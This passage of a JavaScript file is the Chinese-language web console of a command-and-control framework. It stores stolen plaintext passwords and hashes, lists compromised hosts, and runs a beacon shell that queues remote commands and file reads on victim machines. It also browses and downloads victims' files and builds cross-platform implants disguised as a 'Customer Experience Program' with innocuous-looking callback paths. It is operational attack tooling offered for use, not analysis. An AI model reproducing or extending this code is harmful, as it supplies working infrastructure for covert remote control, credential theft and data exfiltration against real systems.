  const rows = (data.Credentials || []).map((item) => `<tr><td>${esc(item.Username)}</td><td>${esc(item.Plaintext)}</td><td class="mono">${esc(item.Hash)}</td><td>${esc(item.Collection)}</td><td><button class="small danger" data-id="${esc(item.ID)}">删除</button></td></tr>`);
  view.innerHTML = `
    <form id="cred" class="panel"><h3>记下一个账号</h3><div class="row">
      <label>用户名<input name="username"></label><label>密码原文<input name="plaintext"></label>
      <label>密码哈希<input name="hash"></label><label>分组<input name="collection" value="manual"></label>
    </div><button type="submit">保存</button></form>
    <section class="panel"><h3>保存过的账号</h3>${table(["用户名", "密码原文", "密码哈希", "分组", ""], rows)}</section>`;
  $("cred").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    await api("/api/creds/add", { method: "POST", json: Object.fromEntries(form.entries()) });
    render();
  };
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/creds/delete", { method: "POST", json: { id: button.dataset.id } });
    render();
  });
}

async function renderHosts(view) {
  const data = await api("/api/hosts");
  const rows = (data.Hosts || []).map((item) => `<tr><td>${esc(item.Hostname)}</td><td>${esc(item.OSVersion)}</td><td class="mono">${esc(item.HostUUID)}</td><td><button class="small danger" data-id="${esc(item.HostUUID)}">删除</button></td></tr>`);
  view.innerHTML = `<section class="panel"><h3>历史机器</h3>${table(["机器名", "系统", "唯一编号", ""], rows)}</section>`;
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/hosts/delete", { method: "POST", json: { hostUUID: button.dataset.id } });
    render();
  });
}

async function renderWebsites(view) {
  const data = await api("/api/websites");
  const rows = [];
  for (const site of data.Websites || []) {
    const paths = Object.keys(site.Contents || {});
    if (!paths.length) {
      rows.push(`<tr><td>${esc(site.Name)}</td><td class="mono">/</td><td>还没有文件</td><td><button class="small danger" data-name="${esc(site.Name)}">删除整站</button></td></tr>`);
      continue;
    }
    paths.forEach((item, index) => {
      rows.push(`<tr><td>${index === 0 ? esc(site.Name) : ""}</td><td class="mono">${esc(item)}</td><td>${esc((site.Contents[item] || {}).ContentType || "")}</td><td><button class="small danger" data-site="${esc(site.Name)}" data-path="${esc(item)}">删除这一页</button>${index === 0 ? ` <button class="small danger" data-name="${esc(site.Name)}">删除整站</button>` : ""}</td></tr>`);
    });
  }
  view.innerHTML = `
    <form id="site-add" class="panel"><h3>放上一个页面</h3>
      <div class="row">
        <label>网站名称<input name="name" placeholder="例如 cover" required></label>
        <label>访问路径<input name="path" value="/" placeholder="/ 或 /about"></label>
        <label>文件<input name="file" type="file" required></label>
      </div>
      <button type="submit">放到这个路径</button>
      <p id="site-note" class="hint">同一个网站名称可以放多个路径。同一路径再次上传会覆盖。要让别人打开它，到「监听端口」开 HTTP 或 HTTPS，并选这个网站名称。</p>
    </form>
    <section class="panel"><h3>正在托管的网页</h3>${table(["网站", "访问路径", "类型", ""], rows)}</section>`;
  $("site-add").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    const note = $("site-note");
    note.textContent = "正在保存…";
    try {
      const res = await fetch("/api/websites/content", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: form });
      const type = res.headers.get("content-type") || "";
      const payload = type.includes("json") ? await res.json() : null;
      if (!res.ok) throw new Error((payload && payload.error) || "保存失败");
      note.textContent = "已放到 " + (form.get("path") || "/");
      render();
    } catch (err) {
      note.textContent = err.message;
    }
  };
  view.querySelectorAll("[data-name]").forEach((button) => button.onclick = async () => {
    await api("/api/websites/delete", { method: "POST", json: { name: button.dataset.name } });
    render();
  });
  view.querySelectorAll("[data-path]").forEach((button) => button.onclick = async (event) => {
    event.stopPropagation();
    await api("/api/websites/content/delete", { method: "POST", json: { name: button.dataset.site, path: button.dataset.path } });
    render();
  });
}

async function renderConfig(view) {
  const [profiles, canaries, builders, compiler, pivots, certs] = await Promise.all([
    api("/api/c2profiles"), api("/api/canaries"), api("/api/builders"), api("/api/compiler"), api("/api/pivots"), api("/api/certificates"),
  ]);
  const profileRows = (profiles.configs || profiles.Configs || []).map((item) => `<tr><td>${esc(item.Name)}</td></tr>`);
  const canaryRows = (canaries.Canaries || []).map((item) => `<tr><td>${esc(item.ImplantName)}</td><td>${esc(item.Domain)}</td><td>${item.Triggered ? "已触发" : "未触发"}</td><td>${esc(item.Count)}</td></tr>`);
  const builderRows = (builders.Builders || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${esc(item.OperatorName)}</td><td>${esc(item.GOOS)}/${esc(item.GOARCH)}</td></tr>`);
  view.innerHTML = `
    <section class="panel"><h3>网页回连用的配置</h3>${table(["名称"], profileRows)}</section>
    <section class="panel"><h3>有人访问这些域名时告警</h3>${table(["程序名", "域名", "状态", "次数"], canaryRows)}</section>
    <section class="panel"><h3>外部编译机器</h3>${table(["名称", "谁在用", "系统"], builderRows)}</section>
    <section class="panel"><h3>这台电脑能编译哪些系统</h3><pre class="output">${esc(JSON.stringify({ GOOS: compiler.GOOS, GOARCH: compiler.GOARCH, Targets: compiler.Targets }, null, 2))}</pre></section>
    <section class="panel"><h3>机器之间的跳板关系</h3><pre class="output">${esc(JSON.stringify(pivots, null, 2))}</pre></section>
    <section class="panel"><h3>证书</h3><pre class="output">${esc(JSON.stringify(certs, null, 2))}</pre></section>`;
}

async function renderOperators(view) {
  const data = await api("/api/operators");
  const rows = (data.Operators || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${item.Online ? "在线" : "离线"}</td></tr>`);
  view.innerHTML = `<section class="panel"><h3>可以登录的账号</h3>${table(["名称", "状态"], rows)}</section>`;
}

function stopLiteTimers() {
  clearInterval(state.liteClock);
  clearInterval(state.litePoll);
  clearInterval(state.liteDirPoll);
  state.liteClock = null;
  state.litePoll = null;
  state.liteDirPoll = null;
}

function liteBeacon(id) {
  return (state.liteBeacons || []).find((item) => item.ID === id);
}

function liteEnsure(id) {
  if (!state.liteEntries[id]) state.liteEntries[id] = [];
  if (!state.liteHist[id]) state.liteHist[id] = [];
  if (state.liteHistIdx[id] == null) state.liteHistIdx[id] = 0;
  return state.liteEntries[id];
}

function litePrompt(b) {
  const info = (b && b.Info) || {};
  return `${info.Username || "user"}@${info.Hostname || "host"} $ `;
}

function liteAgo(iso) {
  if (!iso) return "从未";
  const ms = Date.now() - new Date(iso).getTime();
  if (isNaN(ms)) return "—";
  const s = Math.max(0, Math.round(ms / 1000));
  if (s < 3) return "刚刚";
  if (s < 60) return s + "s 前";
  if (s < 3600) return Math.floor(s / 60) + "m" + (s % 60) + "s 前";
  return Math.floor(s / 3600) + "h 前";
}

function updateLiteHb() {
  const el = $("lite-hb");
  if (!el) return;
  const b = liteBeacon(state.liteSelected);
  if (!b) {
    el.textContent = "";
    return;
  }
  const interval = b.IntervalSec || 10;
  const age = liteAgeSec(b.LastSeen);
  const lost = liteLost(b);
  const mode = lost ? "失联" : (b.Active ? "干活中" : "空闲");
  let eta = `最近回连 ${age}s 前`;
  let etaClass = "";
  if (lost) {
    eta = `已经 ${age}s 没有回连`;
    etaClass = "late";
  } else if (b.Active) {
    eta = age <= interval ? `固定 ${interval}s，还剩约 ${interval - age}s` : `固定 ${interval}s，已过 ${age}s`;
  } else if (age <= interval) {
    eta = `按 ${interval}s 算还剩约 ${interval - age}s，空闲会在 0.5~3 倍之间浮动`;
  } else {
    eta = `这一轮已经 ${age}s，空闲最长约 ${interval * 3}s`;
  }
  const queued = b.Queued ? `排队 ${b.Queued}` : "队列空";
  el.innerHTML = `<span class="${!lost && b.Active ? "fast" : ""} ${etaClass}">心跳 ${esc(interval)}s · ${mode}</span><span>最近 ${esc(liteAgo(b.LastSeen))}</span><span class="${etaClass}">${esc(eta)}</span><span>${esc(queued)}</span><span>平时 ${esc(b.IdleSec)}s / 干活 ${esc(b.FastSec)}s</span>`;
  const waitText = lost ? "…失联，命令还在队列里" : `…等待回连（已 ${age}s）`;
  const entries = state.liteEntries[state.liteSelected] || [];
  let changed = false;
  for (const item of entries) {
    if (item.kind === "wait" && item.text !== waitText) {
      item.text = waitText;
      changed = true;
    }
  }
  if (changed) paintLiteLog();
}

function paintLiteLog() {
  const log = $("lite-log");
  if (!log) return;
  const entries = state.liteEntries[state.liteSelected] || [];
  log.innerHTML = entries.map((item) => {
    if (item.kind === "sys") return `<span class="lite-sys">${esc(item.text)}</span>`;
    if (item.kind === "cmd") return `<span class="lite-prompt">${esc(item.prompt)}</span>${esc(item.text)}`;
    if (item.kind === "wait") return `<span class="lite-wait">${esc(item.text)}</span>`;
    if (item.kind === "err") return `<span class="lite-err">${esc(item.text)}</span>`;
    return esc(item.text || "");
  }).join("\n");
  log.scrollTop = log.scrollHeight;
}

function formatLiteResult(result) {
  if (result.Kind === "read") {
    const errs = ["", "文件不存在", "没有权限", "文件太大，上限 20MB", "传输中断，请整次重来"];
    if (result.Err) return errs[result.Err] || ("读文件失败 " + result.Err);
    const name = fileNameOf(result.Path) || "file.bin";
    const data = bytesOf(result.Output);
    setTimeout(() => downloadBlob(new Blob([data]), name), 0);
    return `已开始下载 ${name}（${data.length} 字节）`;
  }
  const out = textOf(result.Output);
  if (result.Exit) return (out ? out.replace(/\s*$/, "") + "\n" : "") + `[exit ${result.Exit}]`;
  return out.replace(/\s*$/, "");
}

function applyLiteResults(results) {
  if (!results.length) return;
  const entries = liteEnsure(state.liteSelected);
  for (const result of results) {
    const body = formatLiteResult(result);
    const next = { kind: "out", taskId: result.TaskID, text: body };
    const idx = entries.findIndex((item) => item.kind === "wait" && item.taskId === result.TaskID);
    if (idx >= 0) entries[idx] = next;
    else entries.push(next);
  }
  paintLiteLog();
}

async function pollLiteConsole() {
  if (state.page !== "implants" || !state.liteSelected || !$("lite-input") || state.liteBusy) return;
  state.liteBusy = true;
  try {
    const [beacons, data] = await Promise.all([
      api("/api/lite/beacons"),
      api("/api/lite/results?beacon=" + encodeURIComponent(state.liteSelected)),
    ]);
    state.liteBeacons = beacons.Beacons || [];
    if (!liteBeacon(state.liteSelected)) {
      state.liteSelected = null;
      render();
      return;
    }
    applyLiteResults(data.Results || []);
    updateLiteHb();
    const prompt = $("lite-prompt");
    const b = liteBeacon(state.liteSelected);
    if (prompt && b) prompt.textContent = litePrompt(b);
  } catch (err) {
    const hb = $("lite-hb");
    if (hb) hb.textContent = "刷新失败：" + err.message;
  } finally {
    state.liteBusy = false;
  }
}

function bindLiteShell(b) {
  const input = $("lite-input");
  const form = $("lite-shell");
  if (!input || !form) return;
  let ime = false;
  input.addEventListener("compositionstart", () => { ime = true; });
  input.addEventListener("compositionend", () => {
    ime = true;
    setTimeout(() => { ime = false; }, 0);
  });
  const enterIsIme = (event) => ime || event.isComposing || event.keyCode === 229;
  const send = () => {
    if (ime) return;
    const line = input.value;
    input.value = "";
    return submitLiteLine(b.ID, line);
  };
  form.onsubmit = (event) => { event.preventDefault(); };
  input.onkeydown = (event) => {
    const hist = state.liteHist[b.ID] || [];
    if (event.key === "Enter" && !event.shiftKey) {
      if (enterIsIme(event)) return;
      event.preventDefault();
      send();
      return;
    }
    if (event.key === "ArrowUp") {
      event.preventDefault();
      if (!hist.length) return;
      state.liteHistIdx[b.ID] = Math.max(0, (state.liteHistIdx[b.ID] ?? hist.length) - 1);
      input.value = hist[state.liteHistIdx[b.ID]] || "";
    } else if (event.key === "ArrowDown") {
      event.preventDefault();
      state.liteHistIdx[b.ID] = Math.min(hist.length, (state.liteHistIdx[b.ID] ?? hist.length) + 1);
      input.value = hist[state.liteHistIdx[b.ID]] || "";
    } else if (event.key === "l" && event.ctrlKey) {
      event.preventDefault();
      state.liteEntries[b.ID] = [];
      paintLiteLog();
    } else if (event.key === "c" && event.ctrlKey) {
      event.preventDefault();
      input.value = "";
    }
  };
  input.focus();
}

async function submitLiteLine(id, line) {
  const b = liteBeacon(id) || { ID: id, Info: {} };
  const trimmed = line.trim();
  if (!trimmed) return;
  const entries = liteEnsure(id);
  const prompt = litePrompt(b);
  if (trimmed === ".help") {
    entries.push({ kind: "cmd", prompt, text: trimmed });
    entries.push({ kind: "sys", text: "直接输入命令，等心跳带回结果。每次命令独立执行，没有持续工作目录；连着做请写成 cd /tmp && ls。\n.help        本说明\n.clear       清屏（Ctrl+L 同样）\n.sleep 秒数  改这台的回连间隔\n.read 路径   下载这个文件，最大 20MB，完成后会存到浏览器下载目录\n.kill        让植入体退出" });
    paintLiteLog();
    return;
  }
  if (trimmed === ".clear") {
    state.liteEntries[id] = [];
    paintLiteLog();
    return;
  }
  entries.push({ kind: "cmd", prompt, text: trimmed });
  const hist = state.liteHist[id];
  if (hist[hist.length - 1] !== trimmed) hist.push(trimmed);
  state.liteHistIdx[id] = hist.length;

  let payload;
  if (trimmed === ".kill") {
    payload = { beaconId: id, type: "exit" };
  } else if (trimmed.startsWith(".sleep ")) {
    const interval = Number(trimmed.slice(7).trim());
    if (!interval || interval < 5 || interval > 86400) {
      entries.push({ kind: "err", text: "间隔要在 5 到 86400 秒之间" });
      paintLiteLog();
      return;
    }
    payload = { beaconId: id, type: "sleep", interval };
  } else if (trimmed.startsWith(".read ")) {
    const path = trimmed.slice(6).trim();
    if (!path) {
      entries.push({ kind: "err", text: "缺少路径" });
      paintLiteLog();
      return;
    }
    payload = { beaconId: id, type: "read", path };
  } else {
    payload = { beaconId: id, type: "exec", cmd: trimmed, timeout: 30 };
  }

  try {
    const res = await api("/api/lite/task", { method: "POST", json: payload });
    const live = liteBeacon(id);
    if (live) {
      live.Active = true;
      live.Queued = (live.Queued || 0) + 1;
    }
    if (payload.type === "exit") {
      entries.push({ kind: "sys", text: `已排队退出（任务 ${res.taskId}），等下次心跳执行。` });
    } else if (payload.type === "sleep") {
      entries.push({ kind: "sys", text: `已排队改心跳为 ${payload.interval}s（任务 ${res.taskId}）。` });
    } else if (payload.type === "read") {
      entries.push({ kind: "wait", taskId: res.taskId, text: "…等待回连，文件会分块传回，失败需整次重来" });
    } else {
      entries.push({ kind: "wait", taskId: res.taskId, text: "…等待回连" });
    }
    updateLiteHb();
  } catch (err) {
    entries.push({ kind: "err", text: err.message });
  }
  paintLiteLog();
}

function bindLiteAdmin(cfg) {
  $("lite-listen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      if (cfg.running) await api("/api/lite/listener/stop", { method: "POST", json: {} });
      const res = await api("/api/lite/listener/start", { method: "POST", json: {
        host: form.get("host"), port: Number(form.get("port")), path: form.get("path"), url: form.get("url"),
        idleSec: Number(form.get("idleSec") || 10), fastSec: Number(form.get("fastSec") || 10),
      }});
      $("lite-note").textContent = "已监听 " + res.addr;
      setTimeout(render, 400);
    } catch (err) { $("lite-note").textContent = err.message; }
  };
  const stopBtn = $("lite-stop");
  if (stopBtn) stopBtn.onclick = async () => {
    try { await api("/api/lite/listener/stop", { method: "POST", json: {} }); } catch (err) { $("lite-note").textContent = err.message; }
    render();
  };
  $("lite-cfg-dl").onclick = () => downloadBlob(new Blob([cfg.configH]), "config.h");
  $("lite-cfg-new").onclick = async () => {
    try {
      const fresh = await api("/api/lite/config", { method: "POST", json: {} });
      downloadBlob(new Blob([fresh.configH]), "config.h");
      $("lite-cfg-note").textContent = "已签发新密钥，config.h 已下载";
    } catch (err) { $("lite-cfg-note").textContent = err.message; }
  };
}

function liteAdminHTML(cfg) {
  return `
    <form id="lite-listen" class="panel"><h3>回连监听</h3>
      <p class="hint">C 植入体连这个端口。${cfg.running ? "正在监听：" + esc(cfg.addr) : "当前没在监听。"}平时 ${cfg.idleSec} 秒，打开它的命令行之后 5 分钟内是 ${cfg.fastSec} 秒。</p>
      <div class="row">
        <label>监听地址<input name="host" value="0.0.0.0"></label>
        <label>端口<input name="port" value="8443"></label>
        <label>路径<input name="path" value="/api/v2/sync"></label>
        <label>目标看到的地址<input name="url" placeholder="https://c2.example.com:8443"></label>
      </div>
      <div class="row">
        <label>平时回连秒数<input name="idleSec" value="${esc(cfg.idleSec || 10)}"></label>
        <label>干活时回连秒数<input name="fastSec" value="${esc(cfg.fastSec || 10)}"></label>
      </div>
      <button type="submit">${cfg.running ? "重启监听" : "启动监听"}</button>
      ${cfg.running ? '<button type="button" class="danger" id="lite-stop">停止</button>' : ""}
      <p id="lite-note" class="hint"></p>
    </form>
    <section class="panel"><h3>生成配置</h3>
      <p class="hint">下载 config.h 放到 implant/lite/，再跑 ./build.sh linux 或 ./build.sh windows。当前密钥：${esc((cfg.secretB64 || "").slice(0, 12))}…。签发新密钥后，已经在跑的旧程序仍然认旧密钥。</p>
      <button type="button" id="lite-cfg-dl">下载 config.h</button>
      <button type="button" id="lite-cfg-new">签发新密钥</button>
      <p id="lite-cfg-note" class="hint"></p>
    </section>`;
}

async function renderCImplant(view) {
  view.innerHTML = `
    <div class="lite-actions"><button type="button" class="ghost" id="implant-back">返回列表</button></div>
    <form id="c-gen" class="panel"><h3>生成 C 植入体</h3>
      <p class="hint">和 Go 走同一个 HTTPS 端口。回连路径自己填，写成普通业务接口。密钥在编译时写进程序，服务器会记住它。先在「监听端口」打开 HTTPS。</p>
      <div class="row">
        <label>名称<input name="name" placeholder="留空会自动起名"></label>
        <label>系统<select name="os">
          <option value="linux">linux</option>
          <option value="windows">windows</option>
          <option value="darwin">macOS</option>
          <option value="ios">iOS</option>
          <option value="android">android</option>
        </select></label>
        <label>芯片<select name="arch"><option value="arm64">arm64</option><option value="amd64">amd64</option></select></label>
      </div>
      <div class="row">
        <label>回连地址<input id="c-url" name="url" value="https://127.0.0.1:443" placeholder="https://主机:端口" required></label>
        <label>回连路径<input id="c-path" name="path" placeholder="/api/v1/orders" required></label>
      </div>
      <p id="c-url-preview" class="hint">先填回连地址和回连路径。</p>
      <div class="row">
        <label>伪装预设<select name="dpreset"><option value="">不伪装</option><option value="telemetry">体验计划代理</option></select></label>
        <label>显示名<input name="displayName" placeholder="任务管理器/属性里显示"></label>
        <label>厂商<input name="company"></label>
        <label>版本号<input name="version" placeholder="2.0.3.0"></label>
      </div>
      <div class="row">
        <label>进程名<input name="procName" placeholder="ps 里显示，≤15 字符"></label>
        <label>图标（.ico，可选）<input name="dicon" type="file" accept=".ico"></label>
      </div>
      <p id="c-disguise-note" class="hint">伪装只改外观（版本信息、图标、进程名），不影响杀软判定。全部留空就和现在一样。</p>
      <div class="row">
        <label>平时回连秒数<input name="idleSec" value="10"></label>
        <label>干活时回连秒数<input name="fastSec" value="10"></label>
      </div>
      <button type="submit">生成并下载</button>
      <p id="c-gen-note" class="hint">Mac、Linux、Windows 用 Zig 交叉编译。iOS 和安卓也走 Zig，缺 SDK 时会直接说明编不过。编译要一会儿。</p>
    </form>`;
  $("implant-back").onclick = () => { state.implantKind = null; render(); };
  const arch = view.querySelector("[name=arch]");
  const os = view.querySelector("[name=os]");
  os.onchange = () => {
    if (os.value === "windows" || os.value === "ios" || os.value === "android") arch.value = os.value === "windows" ? "amd64" : "arm64";
  };
  const previewURL = () => {
    const base = ($("c-url").value || "").trim().replace(/\/+$/, "");
    let path = ($("c-path").value || "").trim();
    if (path && !path.startsWith("/")) path = "/" + path;
    $("c-url-preview").textContent = base && path ? "植入体将连接 " + base + path : "先填回连地址和回连路径。";
  };
  $("c-url").oninput = previewURL;
  $("c-path").oninput = previewURL;
  const disguiseDefaults = {
    telemetry: { displayName: "Customer Experience Program", company: "Nimbus Software Ltd.", version: "2.0.3.0", procName: "feedbackagent" },
  };
  const presetSelect = view.querySelector("[name=dpreset]");
  presetSelect.onchange = () => {
    const preset = disguiseDefaults[presetSelect.value];
    view.querySelector("[name=displayName]").value = preset ? preset.displayName : "";
    view.querySelector("[name=company]").value = preset ? preset.company : "";
    view.querySelector("[name=version]").value = preset ? preset.version : "";
    view.querySelector("[name=procName]").value = preset ? preset.procName : "";
  };
  $("c-gen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    const note = $("c-gen-note");
    if (!String(form.get("path") || "").trim()) {
      note.textContent = "先填写回连路径";
      return;
    }
    const payload = {
      name: form.get("name"), os: form.get("os"), arch: form.get("arch"),
      url: form.get("url"), path: form.get("path"),
      idleSec: Number(form.get("idleSec") || 10), fastSec: Number(form.get("fastSec") || 10),
    };
    if (String(form.get("displayName") || "").trim()) {
      payload.displayName = String(form.get("displayName")).trim();
      payload.company = String(form.get("company") || "").trim();
      payload.version = String(form.get("version") || "").trim();
      payload.procName = String(form.get("procName") || "").trim();
      const iconFile = form.get("dicon");
      if (iconFile && iconFile.size) {
        if (iconFile.size > 256 * 1024) {
          note.textContent = "图标超过 256KB";
          return;
        }
        payload.iconB64 = await new Promise((resolve, reject) => {
          const reader = new FileReader();
          reader.onload = () => resolve(String(reader.result).split(",").pop() || "");
          reader.onerror = () => reject(new Error("读取图标失败"));
          reader.readAsDataURL(iconFile);
        });
      }
    }
    note.textContent = "正在编译…";
    try {
      const res = await api("/api/implants/generate-c", { method: "POST", json: payload });
      const blob = await res.blob();
      downloadBlob(blob, res.headers.get("X-Implant-Name") || "c-implant");
      note.textContent = "已下载";
    } catch (err) {
      note.textContent = err.message;
    }
  };
}

function renderLiteConsole(view) {
  const b = liteBeacon(state.liteSelected);
  const info = b.Info || {};
  $("title").textContent = shownAlias(b.ID, info.Hostname || "");
  $("subtitle").textContent = `C · ${(info.OS || "").toLowerCase()}/${info.Arch || ""} · PID ${info.PID || "—"}`;
  const entries = liteEnsure(b.ID);
  if (!entries.length) {
    entries.push({ kind: "sys", text: `已连上 ${litePrompt(b).trim()}（${info.OS || "?"}/${info.Arch || "?"}）\n命令像普通 shell 一样输入，结果随心跳回来，会有延迟。输入 .help 看操作符命令。` });
  }
  view.innerHTML = `
    <div class="lite-actions">
      <button class="ghost" id="lite-back">返回列表</button>
      ${aliasView("span", "lite", b.ID, info.Hostname || "")}
      ${targetActions("lite", b.ID)}
      <span class="hint">回车发送 · 上/下翻历史 · Ctrl+L 清屏</span>
    </div>
    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
    <div class="tabs" id="lite-tabs">
      <button data-tab="term" class="${state.liteTab === "term" ? "active" : ""}">终端</button>
      <button data-tab="files" class="${state.liteTab === "files" ? "active" : ""}">文件</button>
      <button data-tab="grabbed" class="${state.liteTab === "grabbed" ? "active" : ""}">拿回的文件</button>
    </div>
    <div id="lite-body"></div>`;
  $("lite-back").onclick = () => { state.liteSelected = null; state.targetNote = ""; render(); };
  bindTargetActions(view);
  bindAliasEditors(view);
  view.querySelectorAll("#lite-tabs button").forEach((button) => {
    button.onclick = () => { state.liteTab = button.dataset.tab; render(); };
  });
  stopLiteTimers();
  const body = view.querySelector("#lite-body");
  if (state.liteTab === "files") return renderLiteFiles(body, b);
  if (state.liteTab === "grabbed") return renderGrabbed(body, "lite:" + b.ID);
  body.innerHTML = `
    <section class="lite-term">
      <div class="lite-hb" id="lite-hb"></div>
      <pre class="lite-log" id="lite-log"></pre>
      <form id="lite-shell" class="lite-input-row">
        <span class="lite-prompt" id="lite-prompt">${esc(litePrompt(b))}</span>
        <input id="lite-input" autocomplete="off" spellcheck="false" placeholder="输入命令">
        <button type="submit" class="lite-send" tabindex="-1">发送</button>
      </form>
    </section>`;
  paintLiteLog();
  updateLiteHb();
  bindLiteShell(b);
  state.liteClock = setInterval(updateLiteHb, 1000);
  state.litePoll = setInterval(pollLiteConsole, 2000);
  pollLiteConsole();
}

function liteParentDir(path) {
  let p = String(path || ".").replace(/\/+$/, "");
  if (!p || p === "." || p === "/") return "/";
  const idx = p.lastIndexOf("/");
  if (idx < 0) return ".";
  if (idx === 0) return "/";
  return p.slice(0, idx);
}

function renderLiteFiles(box, b) {
  if (!state.liteDir) state.liteDir = ".";
  box.innerHTML = `
    <div class="panel">
      <form id="lite-dir-form" class="row">
        <label>路径<input id="lite-dir-path" value="${esc(state.liteDir)}"></label>
        <button type="button" class="ghost" id="lite-dir-up">上一级</button>
        <button type="submit">打开</button>
        <button type="button" class="ghost" id="lite-dir-refresh">刷新</button>
      </form>
      <div id="lite-dir-list"></div>
      <p id="lite-dir-note" class="hint"></p>
    </div>`;
  const dirErrs = ["", "目录不存在", "没有权限打开", "这是文件不是目录"];
  const paint = (listing) => {
    if (listing.Err) {
      $("lite-dir-list").innerHTML = "";
      $("lite-dir-note").textContent = dirErrs[listing.Err] || "列目录失败 " + listing.Err;
      return;
    }
    const entries = listing.Entries || [];
    $("lite-dir-list").innerHTML = table(["名称", "大小", "修改时间", ""], entries.map((entry) => {
      const full = joinPath(state.liteDir, entry.Name);
      return `<tr class="files"><td class="fname" data-name="${esc(entry.Name)}" data-dir="${entry.IsDir}">${esc(entry.Name)}${entry.IsDir ? "/" : ""}</td><td>${entry.IsDir ? "—" : esc(entry.Size)}</td><td>${when(entry.ModTime)}</td><td>${entry.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
    }));
    $("lite-dir-note").textContent = (listing.Truncated ? "目录太大，只显示了前一部分；" : "") + "点目录进入，点文件旁的「下载」才会传输。";
    $("lite-dir-list").querySelectorAll("td.fname").forEach((cell) => {
      cell.onclick = () => {
        if (cell.dataset.dir === "true") load(joinPath(state.liteDir, cell.dataset.name), false);
      };
    });
    $("lite-dir-list").querySelectorAll("button[data-dl]").forEach((btn) => {
      btn.onclick = async (event) => {
        event.stopPropagation();
        try {
          const res = await api("/api/lite/task", { method: "POST", json: { beaconId: b.ID, type: "read", path: btn.dataset.dl } });
          $("lite-dir-note").textContent = `已排队下载（任务 ${res.taskId}），传完会自动保存，并出现在「拿回的文件」。`;
        } catch (err) {
          $("lite-dir-note").textContent = err.message;
        }
      };
    });
  };
  const check = async () => {
    if (state.liteTab !== "files" || state.liteSelected !== b.ID) return;
    try {
      const data = await api("/api/lite/ls?beacon=" + encodeURIComponent(b.ID) + "&path=" + encodeURIComponent(state.liteDir));
      if (data.pending) {
        $("lite-dir-note").textContent = "等待回连…（结果会随心跳回来）";
        return;
      }
      if (!data.listing) {
        $("lite-dir-note").textContent = "这台植入体还没回应列目录，稍后再点「刷新」。";
        return;
      }
      paint(data.listing);
    } catch (err) {
      $("lite-dir-note").textContent = err.message;
    }
  };
  const load = async (path, force) => {
    state.liteDir = path || ".";
    $("lite-dir-path").value = state.liteDir;
    $("lite-dir-note").textContent = "等待回连…";
    try {
      await api("/api/lite/ls", { method: "POST", json: { beaconId: b.ID, path: state.liteDir, force: !!force } });
    } catch (err) {
      $("lite-dir-note").textContent = err.message;
      return;
    }
    check();
  };
  $("lite-dir-form").onsubmit = (event) => { event.preventDefault(); load($("lite-dir-path").value.trim() || ".", false); };
  $("lite-dir-up").onclick = () => load(liteParentDir(state.liteDir), false);
  $("lite-dir-refresh").onclick = () => load(state.liteDir, true);
  state.liteDirPoll = setInterval(check, 2000);
  check();
}

const grabTextExts = ["txt", "log", "conf", "cfg", "ini", "yaml", "yml", "toml", "csv", "tsv", "md", "xml", "html", "htm", "css", "js", "ts", "jsx", "tsx", "py", "go", "c", "h", "cpp", "hpp", "java", "rb", "php", "sh", "bash", "ps1", "sql", "env", "properties", "plist", "gitignore", "service", "sock"];
const grabImageExts = ["png", "jpg", "jpeg", "gif", "webp", "bmp", "svg", "ico"];

function grabKind(name) {
  const ext = String(name || "").toLowerCase().split(".");
  const e = ext.length > 1 ? ext.pop() : "";
  if (e === "json" || e === "map") return "json";
  if (e === "jsonl" || e === "ndjson") return "text";
  if (grabImageExts.includes(e)) return "image";
  if (e === "pdf") return "pdf";
  if (e === "mp4" || e === "webm" || e === "m4v") return "video";
  if (e === "mp3" || e === "wav") return "audio";
  if (grabTextExts.includes(e)) return "text";
  return "hex";
}

async function renderGrabbed(box, targetKey) {
  box.innerHTML = `
    <div class="panel">
      <h3>拿回的文件</h3>
      <p class="hint">从这台机器拿回来的文件都留档在服务端，可随时预览或再存到本机。</p>
      <div id="grab-list"></div>
      <div id="grab-preview"></div>
    </div>`;
  let urls = [];
  const freeURLs = () => { urls.forEach((u) => URL.revokeObjectURL(u)); urls = []; };
  const sizeText = (n) => (n >= 1 << 20 ? (n / (1 << 20)).toFixed(1) + " MB" : n >= 1024 ? (n / 1024).toFixed(1) + " KB" : n + " B");
  const preview = async (rec) => {
    const pane = $("grab-preview");
    pane.innerHTML = `<p class="hint">载入中…</p>`;
    let res;
    try {
      res = await api("/api/files/raw?id=" + encodeURIComponent(rec.ID));
    } catch (err) {
      pane.innerHTML = `<p class="hint">${esc(err.message)}</p>`;
      return;
    }
    const blob = await res.blob();
    freeURLs();
    const kind = grabKind(rec.Name);
    const head = `<div class="grab-head"><b>${esc(rec.Name)}</b><span class="hint">${sizeText(rec.Size)} · 来自 ${esc(rec.SourcePath)}</span>
      <button class="ghost" id="grab-save">存到本机</button></div>`;
    let body = "";
    if (kind === "image") {
      const url = URL.createObjectURL(blob);
      urls.push(url);
      body = `<img alt="${esc(rec.Name)}" src="${url}">`;
    } else if (kind === "pdf") {
      const url = URL.createObjectURL(blob);
      urls.push(url);
      body = `<iframe src="${url}" title="${esc(rec.Name)}"></iframe>`;
    } else if (kind === "video" || kind === "audio") {
      const url = URL.createObjectURL(blob);
      urls.push(url);
      body = kind === "video"
        ? `<video controls src="${url}"></video>`
        : `<audio controls src="${url}"></audio>`;
    } else if (kind === "json" || kind === "text") {
      let text = await blob.text();
      if (text.length > 1 << 20) text = text.slice(0, 1 << 20) + "\n…（内容太大，只显示前 1MB，存到本机看全文）";
      if (kind === "json") {
        try { text = JSON.stringify(JSON.parse(text), null, 2); } catch { /* 不是合法 JSON，按原文显示 */ }
      }
      body = `<pre>${esc(text)}</pre>`;
    } else {
      const buf = new Uint8Array(await blob.slice(0, 2048).arrayBuffer());
      let hex = "";
      for (let i = 0; i < buf.length; i += 16) {
        const row = [];
        for (let j = 0; j < 16 && i + j < buf.length; j++) row.push(buf[i + j].toString(16).padStart(2, "0"));
